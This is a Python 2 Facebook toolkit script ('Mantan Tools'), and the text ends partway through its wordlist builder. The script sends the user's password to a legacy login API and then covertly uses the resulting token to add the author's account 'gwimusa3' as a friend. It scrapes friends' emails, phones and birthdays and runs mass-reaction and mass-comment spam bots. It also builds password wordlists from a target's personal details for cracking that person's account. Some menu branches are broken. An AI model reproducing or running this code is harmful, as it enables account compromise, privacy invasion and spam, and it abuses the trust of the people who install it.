# coding=utf-8

import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
from requests.exceptions import ConnectionError
from mechanize import Browser

#-Setting-#
########
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/36.2.2254/119.132; U; id) Presto/2.12.423 Version/12.16')]

#-Keluar-#
def keluar():
	print "\033[1;91m[!] Exit"
	os.sys.exit()

#-Animasi-#
def jalan(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(00000.1)
	
		
##### LOGO #####
logo = """\033[1;97mMantan Tools
\033[1;97m╔════════════════════════════════════════╗
\033[1;97m║\033[1;93m* \033[1;97mGithub  \033[1;91m: \033[1;96mhttps://github.com/khazekira-se7/\033[1;97m║
\033[1;97m║\033[1;93m* \033[1;97mFB      \033[1;91m: \033[1;92m\033[4mMy Facebooks Hanifa Nabila\033[0m  \033[1;97m║
\033[1;97m║\033[1;93m* \033[1;97mVersion \033[1;91m: \033[1;92m\033[4mLagi Bucin \033[0m                     \033[1;97m║
\033[1;97m║\033[1;93m* \033[1;97mThanks To  \033[1;91m: \033[1;96mAbrarGans,SotongGans,mysthck team\033[1;97m║
\033[1;97m╚════════════════════════════════════════╝"""

# titik #
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;91m[●] \033[1;92mMenunggu \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)

back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
gagal = []
idteman = []
idfromteman = []
idmem = []
emmem = []
nomem = []
id = []
em = []
emfromteman = []
hp = []
hpfromteman = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

##### Pilih Login #####
def masuk():
	os.system('reset')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Masuk"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Masuk menggunakan togel"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Keluar dari harapan"
	print "\033[1;97m║"
	msuk = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
	if msuk =="":
		print"\033[1;91m[!] Wrong input"
		keluar()
	elif msuk =="1":
		login()
	elif msuk =="2":
		tokenz()
	elif msuk =="0":
		keluar()
	else:
		print"\033[1;91m[!] Wrong input"
		keluar()

##### LOGIN #####
#================#
def login():
	os.system('reset')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('reset')
		print logo
		print('\033[1;91m[☆] \033[1;92mLOGIN AKUN FACEBOOK \033[1;91m[☆]')
		id = raw_input('\033[1;91m[+] \033[1;36mID\033[1;97m|\033[1;96mEmail\033[1;97m \033[1;91m:\033[1;92m ')
		pwd = getpass.getpass('\033[1;91m[+] \033[1;36mPassword \033[1;91m:\033[1;92m ')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;91m[!] No connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				zedd = open("login.txt", 'w')
				zedd.write(z['access_token'])
				zedd.close()
				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin successfully'
                                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;91m[!] No connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;91m[!] \033[1;93mAccount Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;91m[!] Login Failed")
			os.system('rm -rf login.txt')
			time.sleep(0.01)
			login()
			
##### TOKEN #####
def tokenz():
	os.system('reset')
	print logo
	toket = raw_input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;97m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()
			
##### MENU ##########################################
def menu():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('reset')
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('reset')
		print"\033[1;91m[!] \033[1;93mAccount Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[!] No connection"
		keluar()
	os.system("reset")
	print logo
	print "║\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m"
	print "║\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m ID   \033[1;91m: \033[1;92m"+id
	print "\033[1;97m╚"+40*"═"
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Bot       "
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Others           "
	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Show token           "
        print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Update           "
	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Delete trash          "
	print "\033[1;97m║--\033[1;91m> \033[1;92m6.\033[1;97m LogOut            "
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Exit the programs          "
	print "║"
	pilih()
#-
def pilih():
	zedd = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
	if zedd =="":
		print "\033[1;91m[!] Wrong input"
		pilih()
	elif zedd =="":
		informasi()
	elif zedd =="":
		dump()
	elif zedd =="3":
		menu_hack()
	elif zedd =="1":
		menu_bot()
	elif zedd =="2":
		lain()
	elif zedd =="3":
		os.system('reset')
		print logo
		toket=open('login.txt','r').read()
		print "\033[1;91m[+] \033[1;92mYour token\033[1;91m :\033[1;97m "+toket
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu()
        elif zedd =="4":
                os.system('reset')
                print logo
                print 40 * '\033[1;97m\xe2\x95\x90'
                os.system('git pull origin master')
                raw_input('\n\033[1;91m[ \033[1;97mBack \033[1;91m]')
                menu()
	elif zedd =="5":
		os.remove('out')
	elif zedd =="6":
		os.system('rm -rf login.txt')
		os.system('xdg-open https://facebook.com/raja.muh.raf.7')
		keluar()
	elif zedd =="0":
		keluar()
	else:
		print "\033[1;91m[!] Wrong input"
		pilih()
	
##### INFO #####
def informasi():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	aid = raw_input('\033[1;91m[+] \033[1;92mEnter ID\033[1;97m/\033[1;92mName\033[1;91m : \033[1;97m')
	jalan('\033[1;91m[✺] \033[1;92mWait a minute \033[1;97m...')
	r = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
	cok = json.loads(r.text)
	for i in cok['data']:
		if aid in i['name'] or aid in i['id']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			print 42*"\033[1;97m═"
			try:
				print '\033[1;91m[➹] \033[1;92mName\033[1;97m          : '+z['name']
			except KeyError: print '\033[1;91m[?] \033[1;92mName\033[1;97m          : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mID\033[1;97m            : '+z['id']
			except KeyError: print '\033[1;91m[?] \033[1;92mID\033[1;97m            : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mEmail\033[1;97m         : '+z['email']
			except KeyError: print '\033[1;91m[?] \033[1;92mEmail\033[1;97m         : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mTelephone\033[1;97m     : '+z['mobile_phone']
			except KeyError: print '\033[1;91m[?] \033[1;92mTelephone\033[1;97m     : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mLocation\033[1;97m      : '+z['location']['name']
			except KeyError: print '\033[1;91m[?] \033[1;92mLocation\033[1;97m      : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mDate of birth\033[1;97m : '+z['birthday']
			except KeyError: print '\033[1;91m[?] \033[1;92mDate of birth\033[1;97m : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mSchool\033[1;97m        : '
				for q in z['education']:
					try:
						print '\033[1;91m                   ~ \033[1;97m'+q['school']['name']
					except KeyError: print '\033[1;91m                   ~ \033[1;91mNot found'
			except KeyError: pass
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			menu()
		else:
			pass
	else:
		print"\033[1;91m[✖] User not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu()
		
		
##### MENU BOT #####
#----------------------------------------#
def menu_bot():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Bot Reactions Target Post"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Bot Reactions Grup Post"
	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Bot Komen Target Post"
	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Bot Komen Grup Post"
	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Mass delete Post"
	print "\033[1;97m║--\033[1;91m> \033[1;92m6.\033[1;97m Mass accept friend"
	print "\033[1;97m║--\033[1;91m> \033[1;92m7.\033[1;97m Mass delete friend"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	bot_pilih()
#////////////
def bot_pilih():
	bots = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if bots =="":
		print "\033[1;91m[!] Wrong input"
		bot_pilih()
	elif bots =="1":
		menu_react()
	elif bots =="2":
		grup_react()
	elif bots =="3":
		bot_komen()
	elif bots =="4":
		grup_komen()
	elif bots =="5":
		deletepost()
	elif bots =="6":
		accept()
	elif bots =="7":
		unfriend()
	elif bots =="0":
		menu()
	else:
		print "\033[1;91m[!] Wrong input"
		bot_pilih()
		
##### MENU REACT #####
def menu_react():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	print ("\033[1;97m║--\033[1;91m> \033[1;92m1. \033[1;97mLike")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m2. \033[1;97mLove")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m3. \033[1;97mWow")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m4. \033[1;97mHaha")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m5. \033[1;97mSadBoy")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m6. \033[1;97mAngry")
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	react_pilih()
#//////////////
def react_pilih():
	global tipe
	aksi = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if aksi =="":
		print "\033[1;91m[!] Wrong input"
		react_pilih()
	elif aksi =="1":
		tipe = "LIKE"
		react()
	elif aksi =="2":
		tipe = "LOVE"
		react()
	elif aksi =="3":
		tipe = "WOW"
		react()
	elif aksi =="4":
		tipe = "HAHA"
		react()
	elif aksi =="5":
		tipe = "SAD"
		react()
	elif aksi =="6":
		tipe = "ANGRY"
		react()
	elif aksi =="0":
		menu_bot()
	else:
		print "\033[1;91m[!] Wrong input"
		react_pilih()
#####NEXT
def react():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	ide = raw_input('\033[1;91m[+] \033[1;92mInput ID Target \033[1;91m:\033[1;97m ')
	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
	try:
		oh = requests.get("https://graph.facebook.com/"+ide+"?fields=feed.limit("+limit+")&access_token="+toket)
		ah = json.loads(oh.text)
		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		print 42*"\033[1;97m═"
		for a in ah['feed']['data']:
			y = a['id']
			reaksi.append(y)
			requests.post("https://graph.facebook.com/"+y+"/reactions?type="+tipe+"&access_token="+toket)
			print '\033[1;92m[\033[1;97m'+y[:10].replace('\n',' ')+'... \033[1;92m] \033[1;97m'+tipe
		print 42*"\033[1;97m═"
		print "\r\033[1;91m[+]\033[1;92m Done \033[1;97m"+str(len(reaksi))
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	except KeyError:
		print"\033[1;91m[!] ID not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
		
##### BOT REACT GRUP #####
def grup_react():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	print ("\033[1;97m║--\033[1;91m> \033[1;92m1. \033[1;97mLike")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m2. \033[1;97mLove")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m3. \033[1;97mWow")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m4. \033[1;97mHaha")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m5. \033[1;97mSadBoy")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m6. \033[1;97mAngry")
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	reactg_pilih()
#//////////////
def reactg_pilih():
	global tipe
	aksi = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if aksi =="":
		print "\033[1;91m[!] Wrong input"
		reactg_pilih()
	elif aksi =="1":
		tipe = "LIKE"
		reactg()
	elif aksi =="2":
		tipe = "LOVE"
		reactg()
	elif aksi =="3":
		tipe = "WOW"
		reactg()
	elif aksi =="4":
		tipe = "HAHA"
		reactg()
	elif aksi =="5":
		tipe = "SAD"
		reactg()
	elif aksi =="6":
		tipe = "ANGRY"
		reactg()
	elif aksi =="0":
		menu_bot()
	else:
		print "\033[1;91m[!] Wrong input"
		reactg_pilih()
#####NEXT
def reactg():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	ide = raw_input('\033[1;91m[+] \033[1;92mInput ID Group \033[1;91m:\033[1;97m ')
	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+ide+'&access_token='+toket)
		asw=json.loads(r.text)
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
	except KeyError:
		print"\033[1;91m[!] Group not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		grup_react()
	try:
		oh = requests.get("https://graph.facebook.com/v3.0/"+ide+"?fields=feed.limit("+limit+")&access_token="+toket)
		ah = json.loads(oh.text)
		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		print 42*"\033[1;97m═"
		for a in ah['feed']['data']:
			y = a['id']
			reaksigrup.append(y)
			requests.post("https://graph.facebook.com/"+y+"/reactions?type="+tipe+"&access_token="+toket)
			print '\033[1;92m[\033[1;97m'+y[:10].replace('\n',' ')+'... \033[1;92m] \033[1;97m'+tipe
		print 42*"\033[1;97m═"
		print "\r\033[1;91m[+]\033[1;92m Done \033[1;97m"+str(len(reaksigrup))
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	except KeyError:
		print"\033[1;91m[!] ID not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	
##### BOT KOMEN #####
def bot_komen():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	print "\033[1;91m[!] \033[1;92mUse \033[1;97m'<>' \033[1;92mfor new lines"
	ide = raw_input('\033[1;91m[+] \033[1;92mID Target \033[1;91m:\033[1;97m ')
	km = raw_input('\033[1;91m[+] \033[1;92mComment \033[1;91m:\033[1;97m ')
	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
	km=km.replace('<>','\n')
	try:
		p = requests.get("https://graph.facebook.com/"+ide+"?fields=feed.limit("+limit+")&access_token="+toket)
		a = json.loads(p.text)
		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		print 42*"\033[1;97m═"
		for s in a['feed']['data']:
			f = s['id']
			komen.append(f)
			requests.post("https://graph.facebook.com/"+f+"/comments?message="+km+"&access_token="+toket)
			print '\033[1;92m[\033[1;97m'+km[:10].replace('\n',' ')+'... \033[1;92m]'
		print 42*"\033[1;97m═"
		print "\r\033[1;91m[+]\033[1;92m Done \033[1;97m"+str(len(komen))
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	except KeyError:
		print"\033[1;91m[!] ID not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()

##### BOT KOMEN GRUP #####
def grup_komen():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	print "\033[1;91m[!] \033[1;92mUse \033[1;97m'<>' \033[1;92mfor new lines"
	ide = raw_input('\033[1;91m[+] \033[1;92mID Group  \033[1;91m:\033[1;97m ')
	km = raw_input('\033[1;91m[+] \033[1;92mComment \033[1;91m:\033[1;97m ')
	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
	km=km.replace('<>','\n')
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+ide+'&access_token='+toket)
		asw=json.loads(r.text)
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
	except KeyError:
		print"\033[1;91m[!] Group not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	try:
		p = requests.get("https://graph.facebook.com/v3.0/"+ide+"?fields=feed.limit("+limit+")&access_token="+toket)
		a = json.loads(p.text)
		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		print 42*"\033[1;97m═"
		for s in a['feed']['data']:
			f = s['id']
			komengrup.append(f)
			requests.post("https://graph.facebook.com/"+f+"/comments?message="+km+"&access_token="+toket)
			print '\033[1;92m[\033[1;97m'+km[:10].replace('\n',' ')+'... \033[1;92m]'
		print 42*"\033[1;97m═"
		print "\r\033[1;91m[+]\033[1;92m Done \033[1;97m"+str(len(komengrup))
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	except KeyError:
		print"\033[1;91m[!] Error"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
		
##### HAPUS POST #####
def deletepost():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
		nam = requests.get('https://graph.facebook.com/me?access_token='+toket)
		lol = json.loads(nam.text)
		nama = lol['name']
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	print("\033[1;91m[+] \033[1;92mFrom \033[1;91m: \033[1;97m%s"%nama)
	jalan("\033[1;91m[+] \033[1;92mStart\033[1;97m ...")
	print 42*"\033[1;97m═"
	asu = requests.get('https://graph.facebook.com/me/feed?access_token='+toket)
	asus = json.loads(asu.text)
	for p in asus['data']:
		id = p['id']
		piro = 0
		url = requests.get('https://graph.facebook.com/'+id+'?method=delete&access_token='+toket)
		ok = json.loads(url.text)
		try:
			error = ok['error']['message']
			print '\033[1;91m[\033[1;97m'+id[:10].replace('\n',' ')+'...'+'\033[1;91m] \033[1;95mFailed'
		except TypeError:
			print '\033[1;92m[\033[1;97m'+id[:10].replace('\n',' ')+'...'+'\033[1;92m] \033[1;96mDeleted'
			piro += 1
		except requests.exceptions.ConnectionError:
			print"\033[1;91m[!] Connection Error"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			menu_bot()
	print 42*"\033[1;97m═"
	print"\033[1;91m[+] \033[1;92mDone"
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_bot()
	
##### ACCEPT FRIEND #####
def accept():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
	r = requests.get('https://graph.facebook.com/me/friendrequests?limit='+limit+'&access_token='+toket)
	teman = json.loads(r.text)
	if '[]' in str(teman['data']):
		print"\033[1;91m[!] No friend request"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print 42*"\033[1;97m═"
	for i in teman['data']:
		gas = requests.post('https://graph.facebook.com/me/friends/'+i['from']['id']+'?access_token='+toket)
		a = json.loads(gas.text)
		if 'error' in str(a):
			print "\033[1;97m[ \033[1;91mFailed\033[1;97m ] "+i['from']['name']
		else:
			print "\033[1;97m[ \033[1;92mAccept\033[1;97m ] "+i['from']['name']
	print 42*"\033[1;97m═"
	print"\033[1;91m[+] \033[1;92mDone"
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_bot()
	
##### UNFRIEND ####
def unfriend():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print "\033[1;97mStop \033[1;91mCTRL+C"
	print 42*"\033[1;97m═"
	try:
		pek = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
		cok = json.loads(pek.text)
		for i in cok['data']:
			nama = i['name']
			id = i['id']
			requests.delete("https://graph.facebook.com/me/friends?uid="+id+"&access_token="+toket)
			print "\033[1;97m[\033[1;92m Deleted \033[1;97m] "+nama
	except IndexError: pass
	except KeyboardInterrupt:
		print "\033[1;91m[!] Stopped"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	print"\n\033[1;91m[+] \033[1;92mDone"
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_bot()
	
#### LAIN LAIN #####
#                                    #
####MENU LAIN#####
def lain():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Create Post"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Create Wordlist"
	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Account Checker"
	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m See my group list"
	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Profile Guard"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	pilih_lain()
#////////////
def pilih_lain():
	other = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if other =="":
		print "\033[1;91m[!] Wrong input"
		pilih_lain()
	elif other =="1":
		status()
	elif other =="2":
		wordlist()
	elif other =="3":
		check_akun()
	elif other =="4":
		grupsaya()
	elif other =="5":
		guard()
	elif other =="0":
		menu()
	else:
		print "\033[1;91m[!] Wrong input"
		pilih_lain()
		
##### STATUS #####
def status():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	msg=raw_input('\033[1;91m[+] \033[1;92mType status \033[1;91m:\033[1;97m ')
	if msg == "":
		print "\033[1;91m[!] Don't be empty"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	else:
		res = requests.get("https://graph.facebook.com/me/feed?method=POST&message="+msg+"&access_token="+toket)
		op = json.loads(res.text)
		jalan('\033[1;91m[✺] \033[1;92mCreate \033[1;97m...')
		print 42*"\033[1;97m═"
		print"\033[1;91m[+] \033[1;92mStatus ID\033[1;91m : \033[1;97m"+op['id']
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
		
########### CREATE WORDLIST ##########
def wordlist():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.system('reset')
		print logo
		print "\033[1;91m[?] \033[1;92mFill in the complete data of the target below"
		print 42*"\033[1;97m═"
		a = raw_input("\033[1;91m[+] \033[1;92mNama Depan \033[1;97m: ")
		file = open(a+".txt", 'w')
		b=raw_input("\033[1;91m[+] \033[1;92mNama Tengah \033[1;97m: ")
		c=raw_input("\033[1;91m[+] \033[1;92mNama Belakang \033[1;97m: ")
		d=raw_input("\033[1;91m[+] \033[1;92mNama Panggilan \033[1;97m: ")
		e=raw_input("\033[1;91m[+] \033[1;92mTanggal Lahir >\033[1;96mex: |DDMMYY| \033[1;97m: ")
		f=e[0:2]
		g=e[2:4]
		h=e[4:]
		print 42*"\033[1;97m═"
		print("\033[1;91m[?] \033[1;93mKalo Jomblo SKIP aja :v")
		i=raw_input("\033[1;91m[+] \033[1;92mNama Pacar \033[1;97m: ")
		j=raw_input("\033[1;91m[+] \033[1;92mNama Panggilan Pacar \033[1;97m: ")
		k=raw_input("\033[1;91m[+] \033[1;92mTanggal Lahir Pacar >\033[1;96mex: |DDMMYY| \033[1;97m: ")
		jalan('\033[1;91m[✺] \033[1;92mCreate \033[1;97m...')
		l=k[0:2]
		m=k[2:4]
		n=k[4:]
